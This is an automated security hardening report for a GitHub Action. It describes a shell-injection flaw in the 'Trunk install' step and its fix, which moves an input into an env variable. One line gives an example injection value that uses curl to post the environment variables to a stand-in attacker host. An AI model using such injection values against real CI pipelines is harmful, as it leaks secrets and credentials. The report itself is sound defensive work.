<!-- markdownlint-disable -->

# Hardening Report: trunk-io--trunk-action--install/v1.2.4

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **trunk-io--trunk-action--install/v1.2.4** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a) violation: The 'Trunk install' step in action.yaml directly interpolates `${{ inputs.tools }}` inside a `run:` shell command string: `trunk tools install --ci ${{ inputs.tools }}`. The `inputs.tools` value is attacker-controlled and is substituted into the shell command before the shell ever sees it, allowing an attacker to inject arbitrary shell commands (e.g., by passing a value like `; curl -X POST https://evil.com -d "$(env)"`). The value must be passed via an `env:` variable and double-quoted in the shell command instead.

Locations:

- `action.yaml:27`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.tools }}" appears directly in run: block of step "Trunk install"; move to env: map

Locations:

- `action.yml:32`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed the script injection in the 'Trunk install' step of action.yaml. Moved `${{ inputs.tools }}` out of the run: shell string into an env: variable (INPUT_TOOLS). Since inputs.tools is a space-separated list of tool names, used the xargs-based tokenization pattern to safely split it into an array with quote-aware parsing. The array is then expanded as separate arguments to `trunk tools install --ci`. An empty-guard ensures no empty argument is passed when the optional input is not provided.

